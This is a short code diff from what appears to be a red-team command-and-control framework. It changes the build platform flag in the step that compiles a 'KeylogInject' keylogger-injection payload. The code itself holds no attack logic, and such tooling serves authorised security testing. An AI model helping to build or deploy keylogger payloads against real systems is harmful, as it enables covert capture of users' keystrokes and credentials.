@@ -54,7 +54,7 @@ class KeylogInjectCommand(CommandBase):
         outputPath = "{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name)
             # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/KeylogInject/KeylogInject.csproj -o {}/KeylogInject/bin/Release/".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:Platform=\"Any CPU\" {}/KeylogInject/KeylogInject.csproj -o {}/KeylogInject/bin/Release/".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
